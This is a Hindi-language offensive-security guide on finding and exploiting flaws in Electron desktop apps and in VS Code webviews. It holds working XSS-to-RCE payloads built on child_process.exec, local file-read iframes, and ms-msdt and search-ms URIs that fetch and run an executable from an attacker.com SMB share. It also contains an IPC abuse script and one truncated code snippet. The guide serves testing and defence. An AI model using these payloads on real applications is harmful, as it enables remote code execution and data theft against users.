# Electron डेस्कटॉप ऐप्स

{{#include ../../banners/hacktricks-training.md}}

## परिचय

Electron, विशेषाधिकार प्राप्त **Node.js** main process को **Chromium** renderer processes के साथ जोड़ता है। Electron कोई वेब ब्राउज़र नहीं है: ऐप्लिकेशन कोड जानबूझकर filesystem और shell access जैसी क्षमताएँ उपलब्ध करा सकता है, इसलिए अविश्वसनीय content लोड करने के लिए सामान्य वेबसाइट की तुलना में अधिक सख्त boundary design की आवश्यकता होती है।<sup>[[21]](#references)</sup>

Electron ऐप्लिकेशन कोड को आमतौर पर `.asar` archive में पैकेज किया जाता है। स्रोत की समीक्षा करने से पहले इसे extract करें:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

एप्लिकेशन की `package.json` उसकी मुख्य एंट्री पॉइंट फ़ाइल की पहचान करती है। यह फ़ाइल आमतौर पर renderer विंडो बनाती है और उनकी सुरक्षा-संवेदनशील `webPreferences` सेट करती है।

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron में दो मुख्य process प्रकार होते हैं:

- Main Process (NodeJS का पूरा access होता है)
- Renderer Process (सुरक्षा कारणों से NodeJS का access सीमित होना चाहिए)

![Electron Desktop Apps - Introduction: Renderer Process (सुरक्षा कारणों से NodeJS का access सीमित होना चाहिए)](<../../images/image (182).png>)

एक **renderer process** एक browser window होगा जो एक file लोड करता है:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** प्रत्येक renderer process को कॉन्फ़िगर करता है, आम तौर पर `BrowserWindow` बनाते समय। सुरक्षित सेटिंग्स से renderer के compromise के native code execution में बदलने की संभावना कम होती है, लेकिन वे untrusted content को अपने-आप सुरक्षित नहीं बनातीं।<sup>[[21]](#references)[[22]](#references)</sup>

कम-से-कम इन renderer preferences की समीक्षा करें:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** डिफ़ॉल्ट रूप से `false` होता है। इसे सक्षम करने से renderer JavaScript को Node.js APIs का access मिलता है और उस renderer का sandbox भी अक्षम हो जाता है।
- **`contextIsolation`** डिफ़ॉल्ट रूप से `true` होता है। यह page के JavaScript context को preload scripts और Electron internals द्वारा उपयोग किए जाने वाले context से अलग रखता है।
- **`preload`** का कोई डिफ़ॉल्ट path नहीं होता। कॉन्फ़िगर की गई preload script, page scripts से पहले चलती है और `contextBridge` के ज़रिए सीमित दायरे वाली APIs उपलब्ध करा सकती है।
- **`sandbox`** Electron 20 से डिफ़ॉल्ट रूप से `true` होता है। यह renderer के operating-system resources तक access को सीमित करता है; `nodeIntegration: true` सेट करने से यह अक्षम हो जाता है।
- **`nodeIntegrationInWorker`** डिफ़ॉल्ट रूप से `false` होता है और Web Workers में Node.js integration को नियंत्रित करता है।
- **`nodeIntegrationInSubFrames`** डिफ़ॉल्ट रूप से `false` होता है।
  - यदि **`nodeIntegration`** **सक्षम** है, तो इससे Electron application के भीतर **iframes में लोड किए गए** web pages में **Node.js APIs** का उपयोग किया जा सकता है।
  - यदि **`nodeIntegration`** **अक्षम** है, तो preloads iframe में लोड होंगी

कॉन्फ़िगरेशन का उदाहरण:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

यहाँ से कुछ **RCE payloads**: [यहाँ](https://7as.es/electron/nodeIntegration_rce.txt)<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### ट्रैफ़िक कैप्चर करें

start-main कॉन्फ़िगरेशन में बदलाव करें और proxy जैसे किसी टूल का उपयोग जोड़ें:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REA के साथ ASAR-to-native सीमा की स्थिर ट्रेसिंग

**REA** किसी ASAR या निकाली गई application directory को उसका JavaScript bootstrap चलाए बिना पढ़ सकता है। इसका application graph package entry points, bundled modules, `BrowserWindow` और preload settings, `contextBridge` members, IPC registrations, native add-on requests और source-map identities दर्ज करता है। इससे renderer द्वारा expose की गई capability को privileged main-process handler तक trace करने की शुरुआत की जा सकती है।<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

एक literal feature string के लिए, पूरा Evidence record `application` के रूप में पास करें और seed को target में देखे गए seed से बदलें:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

वही `trace_application_feature` workflow किसी observed literal API member, IPC channel या module को seed के रूप में भी स्वीकार करता है। लौटाए गए source locations के आधार पर परिणामी handler path, validation candidates और native handoff की जाँच करें। Renderer का `invoke` केवल उसी exact literal channel पर मौजूद एक unique `ipcMain.handle`/`handleOnce` candidate से मेल खाता है; इसी तरह `send` के लिए एक unique `ipcMain.on`/`once`/`addListener` candidate आवश्यक है। Dynamic या duplicate handlers unresolved रहते हैं। अनुरोधित `.node` member verified native export नहीं होता; ऐसा निष्कर्ष निकालने से पहले मेल खाते Hopper/Ghidra Evidence का artifact digest समान होना चाहिए। Static reachability से यह भी सिद्ध नहीं होता कि path वास्तव में execute हुआ था।<sup>[[24]](#references)[[25]](#references)</sup>

Renderer-to-main trust boundary और handler validation के लिए, [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) देखें।

Provider-bound native follow-up के लिए, [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) देखें।

## Electron auto-update attack surface

Release-feed integrity, rollback, signed-channel confusion और staging-file TOCTOU के लिए, [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) देखें।

## Electron Local Code Injection

Installed app में local write या instrumentation access होने पर, ASAR/main-process और V8 snapshot paths के साथ OS-specific links के लिए [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) देखें।

## RCE: XSS + nodeIntegration

यदि **nodeIntegration** को **on** पर सेट किया गया है, तो वेब पेज का JavaScript केवल `require()` को call करके आसानी से Node.js features का उपयोग कर सकता है। उदाहरण के लिए, Windows पर calc application execute करने का तरीका यह है:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

इस setting में निर्दिष्ट script **renderer में अन्य scripts से पहले लोड की जाती है**, इसलिए इसे Node APIs तक **असीमित access** प्राप्त होता है:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

इसलिए, script node-features को pages में export कर सकती है:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **अगर `contextIsolation` चालू है, तो यह काम नहीं करेगा**

## RCE: XSS + contextIsolation

_**contextIsolation**_ वेब पेज की scripts और JavaScript Electron के आंतरिक code के बीच **अलग-अलग contexts बनाता है**, ताकि हर code का JavaScript execution दूसरे को प्रभावित न करे। RCE की संभावना को खत्म करने के लिए यह एक ज़रूरी feature है।

अगर contexts अलग-थलग नहीं हैं, तो attacker:

1. **renderer में मनमाना JavaScript execute कर सकता है** (XSS या बाहरी sites पर navigation के ज़रिए)
2. preload या Electron के आंतरिक code में इस्तेमाल होने वाले **built-in method को अपने function से overwrite कर सकता है**
3. **overwrite किए गए function के इस्तेमाल को trigger कर सकता है**
4. RCE?

ऐसी 2 जगहें हैं जहाँ built-in methods overwrite किए जा सकते हैं: preload code या Electron के आंतरिक code में:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### क्लिक इवेंट बायपास

अगर किसी link पर click करने पर पाबंदियाँ लागू होती हैं, तो सामान्य left click की जगह **middle click करके** आप उन्हें bypass कर सकते हैं.

```javascript
window.addEventListener('click', (e) => {
```

## shell.openExternal के ज़रिए RCE

इन उदाहरणों के बारे में अधिक जानकारी के लिए [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) और [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup> देखें।

Electron desktop application deploy करते समय, `nodeIntegration` और `contextIsolation` की सही settings सुनिश्चित करना महत्वपूर्ण है। यह स्थापित है कि इन settings के लागू होने पर, main process से preload scripts या Electron के native code को निशाना बनाने वाले **client-side remote code execution (RCE)** को प्रभावी ढंग से रोका जा सकता है।

जब कोई user links के साथ इंटरैक्ट करता है या नई windows खोलता है, तो कुछ खास event listeners trigger होते हैं, जो application की security और functionality के लिए महत्वपूर्ण हैं:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

ये listeners **desktop application द्वारा override किए जाते हैं**, ताकि वह अपना **business logic** लागू कर सके। Application यह तय करता है कि navigated link को internally खोला जाना चाहिए या external web browser में। यह निर्णय आमतौर पर `openInternally` function के ज़रिए लिया जाता है। यदि यह function `false` लौटाता है, तो इसका अर्थ है कि link को `shell.openExternal` function का उपयोग करके externally खोला जाना चाहिए।

**यहाँ एक सरलीकृत pseudocode दिया गया है:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS की security best practices के अनुसार, `openExternal` function के साथ untrusted content स्वीकार नहीं करना चाहिए, क्योंकि इससे विभिन्न protocols के ज़रिए RCE हो सकता है। Operating systems अलग-अलग protocols को support करते हैं, जो RCE trigger कर सकते हैं। इस विषय पर विस्तृत उदाहरणों और आगे की व्याख्या के लिए [यह resource](https://positive.security/blog/url-open-rce#windows-10-19042) देखें, जिसमें इस vulnerability का फायदा उठाने में सक्षम Windows protocol के उदाहरण शामिल हैं।<sup>[[10]](#references)</sup>

macOS में, `openExternal` function का फायदा उठाकर मनमाने commands execute किए जा सकते हैं, जैसे `shell.openExternal('file:///System/Applications/Calculator.app')`।

**Windows protocol exploits के उदाहरणों में शामिल हैं:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

यह vuln **[इस रिपोर्ट](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** में पाया जा सकता है।<sup>[[11]](#references)</sup>

**webviewTag** एक **deprecated feature** है, जो **renderer process** में **NodeJS** के इस्तेमाल की अनुमति देता है। इसे disabled कर देना चाहिए, क्योंकि इससे preload context के अंदर इस तरह script load की जा सकती है:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

इसलिए, कोई हमलावर यदि मनमाना पेज लोड करने में कामयाब हो जाए, तो वह उस टैग का उपयोग करके **मनमानी preload script लोड कर सकता है**।

इसके बाद इस preload script का दुरुपयोग करके **vulnerable IPC service (`skype-new-window`)** को कॉल किया गया, जो RCE हासिल करने के लिए **`shell.openExternal`** को कॉल कर रही थी:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## आंतरिक फ़ाइलें पढ़ना: XSS + contextIsolation

**`contextIsolation` को अक्षम करने से `<webview>` tags का उपयोग संभव होता है**, जो `<iframe>` के समान हैं और स्थानीय फ़ाइलें पढ़ने तथा exfiltrate करने के लिए इस्तेमाल किए जा सकते हैं। दिए गए उदाहरण में दिखाया गया है कि इस vulnerability का उपयोग करके आंतरिक फ़ाइलों की सामग्री कैसे पढ़ी जा सकती है:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - आंतरिक फ़ाइलें पढ़ना: XSS + contextIsolation: contextIsolation को अक्षम करने से tags का उपयोग संभव होता है, जो के समान हैं, और ... के लिए](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

इसके अलावा, **आंतरिक फ़ाइल पढ़ने** का एक और तरीका साझा किया गया है, जो Electron desktop app में मौजूद एक गंभीर local file read vulnerability को उजागर करता है। इसमें application का exploit करने और डेटा exfiltrate करने के लिए script inject करना शामिल है:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + पुराना Chromium**

अगर application के साथ bundled **Chromium** version पुराना है और उसमें ज्ञात vulnerabilities हैं, तो उसका exploit करके XSS को RCE में बदलना संभव हो सकता है।<sup>[[20]](#references)</sup>\
इसका एक उदाहरण इस **writeup** में देखें: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Internal URL regex bypass के ज़रिए XSS Phishing**

अगर आपको XSS मिलता है, लेकिन आप **RCE trigger नहीं कर सकते या internal files चुरा नहीं सकते**, तो आप **phishing के ज़रिए credentials चुराने** की कोशिश कर सकते हैं।<sup>[[1]](#references)</sup>

सबसे पहले, यह पता लगाने के लिए frontend code देखें कि नया URL खोलने पर क्या होता है:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** को call करना तय करता है कि कोई platform link **डेस्कटॉप विंडो** में खुलेगा या कोई third-party resource system browser में।

अगर function के URL allowlist regex को bypass किया जा सकता है—उदाहरण के लिए, hostname में dots को escape न किए जाने के कारण—तो attacker, attacker-controlled infrastructure पर एक भरोसेमंद दिखने वाला credential prompt खोलने के लिए XSS का दुरुपयोग कर सकता है:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

[Electron security guide](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) में बताया गया है कि **`file://`** पर चलने वाले पेजों को फ़ाइलों तक व्यापक पहुँच मिलती है। इसलिए, **XSS का उपयोग उपयोगकर्ता की मशीन से मनमानी फ़ाइलें लोड करने के लिए किया जा सकता है**। सही तरीके से डिज़ाइन किया गया **custom protocol** पहुँच को फ़ाइलों के किसी खास समूह तक सीमित कर सकता है।<sup>[[21]](#references)</sup>

Desktop assistant previews में worker-context file-scope bypass के बारे में जानने के लिए, [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope) देखें।

## Remote module

Electron Remote module, **renderer processes को main process APIs तक पहुँचने** देता है, जिससे Electron application के भीतर संचार आसान होता है। हालाँकि, इस module को सक्षम करने से सुरक्षा संबंधी गंभीर जोखिम पैदा होते हैं। इससे application का attack surface बढ़ता है और वह cross-site scripting (XSS) attacks जैसी vulnerabilities के प्रति अधिक संवेदनशील हो जाती है।

> [!TIP]
> हालाँकि **remote** module, main से renderer processes तक कुछ APIs उपलब्ध कराता है, लेकिन केवल components का दुरुपयोग करके RCE हासिल करना आसान नहीं है। फिर भी, ये components संवेदनशील जानकारी उजागर कर सकते हैं।

> [!WARNING]
> कई apps जो अब भी remote module का उपयोग करते हैं, वे ऐसा इस तरह करते हैं कि renderer process में **NodeIntegration सक्षम होना आवश्यक होता है**, जो **एक बहुत बड़ा सुरक्षा जोखिम** है।

Electron का built-in `remote` module deprecated कर दिया गया था और बाद में हटा दिया गया; जिन applications को अब भी इसका model चाहिए, वे अलग `@electron/remote` package का उपयोग कर सकती हैं। सुरक्षा और performance पर पड़ने वाले प्रभावों के कारण, untrusted renderers को remote-style capabilities देने से बचें।

`@electron/remote` के साथ, इसे पहले **main process में initialize करना आवश्यक है**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

इसके बाद renderer process module से objects import कर सकता है:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[ब्लॉग पोस्ट](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** remote module के **`app`** object द्वारा exposed कुछ दिलचस्प **functions** बताती है:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - मौजूदा instance को **बंद** करके नया instance **launch** करने के लिए application को **restart** करता है। **App updates** या बड़े **state changes** के लिए उपयोगी।
- **`app.setAppLogsPath([path])`**  
   - **App logs** को store करने के लिए directory **set** या **create** करता है। Logs को **`app.getPath()`** या **`app.setPath(pathName, newPath)`** का उपयोग करके **प्राप्त** या **बदला** जा सकता है।
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - मौजूदा executable को किसी निर्दिष्ट **protocol** के लिए **default handler** के रूप में **register** करता है। ज़रूरत पड़ने पर आप **custom path** और **arguments** दे सकते हैं।
- **`app.setUserTasks(tasks)`**  
   - **Jump List** (Windows पर) में **Tasks category** में tasks **जोड़ता** है। हर task यह नियंत्रित कर सकता है कि app कैसे **launch** हो या कौन-से **arguments** दिए जाएँ।
- **`app.importCertificate(options, callback)`**  
   - **PKCS#12 certificate** को system के **certificate store** में **import** करता है (केवल Linux पर)। परिणाम को संभालने के लिए **callback** का उपयोग किया जा सकता है।
- **`app.moveToApplicationsFolder([options])`**  
   - Application को **Applications folder** (macOS पर) में **move** करता है। Mac users के लिए **standard installation** सुनिश्चित करने में मदद करता है।
- **`app.setJumpList(categories)`**  
   - Windows पर **custom Jump List** को **set** या **remove** करता है। आप यह व्यवस्थित करने के लिए **categories** निर्दिष्ट कर सकते हैं कि tasks user को कैसे दिखाई दें।
- **`app.setLoginItemSettings(settings)`**  
   - **Login** के समय कौन-से **executables** launch हों और उनके साथ कौन-से **options** हों, इसे **configure** करता है (केवल macOS और Windows पर)।
  
उदाहरण:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences मॉड्यूल

Electron में system preferences तक पहुँचने और **system events उत्सर्जित करने** के लिए **प्राथमिक API**। **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, और **setUserDefault** जैसे methods इस मॉड्यूल का **हिस्सा** हैं।

**उदाहरण उपयोग:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **सुनता है** NSDistributedNotificationCenter का उपयोग करके **native macOS notifications** के लिए।  
* **macOS Catalina** से पहले, CFNotificationCenterAddObserver को **nil** देकर आप **सभी** distributed notifications को sniff कर सकते थे।  
* **Catalina / Big Sur** के बाद, sandboxed apps अब भी notifications को **नाम के आधार पर** register करके **कई events** (उदाहरण के लिए, **screen locks/unlocks**, **volume mounts**, **network activity** आदि) को **subscribe** कर सकते हैं।

### **getUserDefault / setUserDefault**

* macOS पर **application** या **global** preferences स्टोर करने वाले **NSUserDefaults** के साथ **इंटरफ़ेस** करता है।
    
* **getUserDefault**, संवेदनशील जानकारी जैसे **हाल की फ़ाइलों के स्थान** या **उपयोगकर्ता की भौगोलिक स्थिति** को **प्राप्त** कर सकता है।
    
* **setUserDefault** इन preferences को **बदल** सकता है, जिससे संभावित रूप से किसी app का **configuration** प्रभावित हो सकता है।
    
* **Electron के पुराने versions** (v8.3.0 से पहले) में, केवल NSUserDefaults का **standard suite** ही **accessible** था।

## Shell.showItemInFolder

यह function दी गई file को file manager में दिखाता है। प्रभावित platforms और versions पर, इस interaction से **file अपने-आप execute हो सकती थी**।

अधिक जानकारी के लिए देखें [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron apps में **XSS attacks को रोकने** के लिए **Content Security Policy (CSP)** होनी चाहिए। **CSP** एक **security standard** है, जो browser में **untrusted code के execution को रोकने** में मदद करता है।

इसे आमतौर पर **`main.js`** file में या **`index.html`** template में **meta tag** के अंदर CSP के साथ **configure** किया जाता है।

अधिक जानकारी के लिए देखें:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

इस वास्तविक दुनिया की chain ने Visual Studio Code 1.63 (CVE-2021-43908) को प्रभावित किया और दिखाया कि misconfigured CSP, postMessage और scheme handlers की स्थिति में webview में एक अकेले markdown-driven XSS को full RCE तक कैसे बढ़ाया जा सकता है। सार्वजनिक PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Attack chain का अवलोकन
- webview CSP के ज़रिए पहला XSS: Generated CSP में `style-src 'self' 'unsafe-inline'` शामिल था, जिससे `vscode-webview://` context में inline/style-based injection संभव हुआ। Payload ने target webview के extensionId को exfiltrate करने के लिए `/stealID` पर beacon भेजा।
- target webview URL बनाना: leaked ID का उपयोग करके `vscode-webview://<extensionId>/.../<publicUrl>` बनाया गया।
- postMessage trust के ज़रिए दूसरा XSS: बाहरी webview ने सख्त origin/type checks के बिना `window.postMessage` पर भरोसा किया और `allowScripts: true` के साथ attacker का HTML लोड किया।
- scheme/path rewriting के ज़रिए local file लोड करना: Payload ने `file:///...` को `vscode-file://vscode-app/...` में rewrite किया और कमजोर path validation का दुरुपयोग करके privileged local resource लोड करने के लिए `exploit.md` को `RCE.html` से बदल दिया।
- Node-enabled context में RCE: लोड किए गए HTML ने उपलब्ध Node APIs के साथ execute होकर OS command execution हासिल किया।

अंतिम context में RCE का उदाहरण primitive
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

postMessage trust issues पर संबंधित पठन:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: synthetic webview shortcuts + declarative extension command bridges

जून 2026 में VS Code webview escape का एक अलग प्रकार सामने आया: **notebook/preview webview के अंदर untrusted JavaScript privileged global shortcuts बना सकता था**, क्योंकि webview preload `keydown` डेटा को host workbench तक भेजता था और host उसे वास्तविक user input मानकर संभालता था।<sup>[[14]](#references)</sup>

यह IDE trust-boundary attacks के व्यापक इतिहास का हिस्सा है, जिसमें project-controlled content privileged editor features तक पहुँचता है।<sup>[[19]](#references)</sup>

### सीमा विफलता

यदि कोई cross-origin/sandboxed webview attacker-controlled keyboard fields (`key`, `code`, `keyCode`, modifiers, `repeat`) को **`event.isTrusted` की जाँच किए बिना** privileged `postMessage`/message-port bridge में कॉपी करता है, तो webview के अंदर JavaScript ये workbench shortcuts चला सकता है:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

यह विशेष रूप से तब उपयोगी होता है जब browser द्वारा **synthetic typing अवरुद्ध** हो। Scripted key events आमतौर पर HTML `<input>` elements में मनमाना टेक्स्ट **टाइप नहीं कर सकते**, लेकिन वे फिर भी ऐसे shortcuts ट्रिगर कर सकते हैं जो सीधे `keydown` का उपयोग करते हैं।

### व्यावहारिक दुरुपयोग के तरीके

- **Shortcut-केंद्रित UI का दुरुपयोग:** commands टाइप करने की कोशिश करने के बजाय, notification स्वीकार करने, palette navigation, focused button सक्रिय करने या menu में आगे बढ़ने जैसी global bindings को target करें।
- **Workspace metadata से अनुमानित privileged prompts:** repository द्वारा नियंत्रित `.vscode/extensions.json` किसी attacker extension की सिफ़ारिश कर सकती है और एक अनुमानित install notification बना सकती है, जिसे `Ctrl+Shift+A` जैसे shortcut से स्वीकार किया जा सकता है।
- **Command bridge के रूप में declarative extension manifest:** भले ही web VS Code में CSP के कारण local workspace extension code अवरुद्ध हो, फिर भी declarative `package.json` contributions लोड हो सकते हैं। `.vscode/extensions` के अंतर्गत कोई local extension ऐसा keybinding register कर सकता है जो `runCommands` और फिर `workbench.extensions.installExtension` जैसे privileged internal command को call करता है।<sup>[[14]](#references)[[18]](#references)</sup>

उदाहरण manifest पैटर्न:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **अविश्वसनीय metadata से उपलब्ध छिपे हुए security flags:** यदि internal command attacker-controlled arguments स्वीकार करता है, जैसे `{"context":{"skipPublisherTrust":true}}`, तो declarative metadata trust dialog को दबा सकता है और Marketplace/CDN-hosted extension install कर सकता है, जो अंततः attacker code execute करता है।
- **Trusted-workspace का दुरुपयोग:** यदि remote/web workspaces को अपने-आप trusted माना जाता है, तो local workspace extensions repository content से privileged editor actions तक पहुँचने का महत्वपूर्ण माध्यम बन जाते हैं।
- **Compromise के बाद scope का विस्तार:** Extension execution के बाद जाँचें कि editor extensions को कौन-से tokens देता है। `github.dev` में चुराया गया GitHub token खुले हुए repository से आगे भी मान्य था, इसलिए `https://api.github.com/user/repos` को query करने से अन्य accessible private repositories की सूची मिल गई।

### Audit notes

- **Webview से host तक input forwarding** को privilege boundary मानें; untrusted frames से synthetic key/click events को host में कभी दोबारा dispatch न करें।
- Sensitive commands के **अंदर** authorization लागू करें। Caller-provided command context स्वीकार न करें, जो `skipPublisherTrust` जैसे internal flags सेट कर सके।
- यह न मानें कि executable local extension code को block करना ही पर्याप्त है; workspace-controlled manifests से आने वाले **declarative contributions** (`keybindings`, `menus`, `commands`, tasks) की भी समीक्षा करें।
- June 3, 2026 के fixes ने forwarded events में `isTrusted` जोड़ा, notebook webviews में untrusted key forwarding disabled किया, और caller-supplied install-command context स्वीकार करना बंद किया।<sup>[[16]](#references)[[17]](#references)</sup>

## **Tools**

चुना हुआ **awesome-electronjs-hacking** संग्रह अतिरिक्त research, tooling और vulnerable-application संसाधन उपलब्ध कराता है।<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) Electron-आधारित applications में misconfigurations और security anti-patterns की पहचान करने वाला tool है।
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) Electron applications के लिए एक open source VS Code plugin है, जो Electronegativity का उपयोग करता है।
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) vulnerable third-party libraries की जाँच करता है।
- [**Electro.ng**](https://electro.ng/) एक commercial Electron security-analysis tool है।

## Labs

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) पर आप vulnerable Electron apps exploit करने के लिए एक lab पा सकते हैं।<sup>[[4]](#references)</sup>

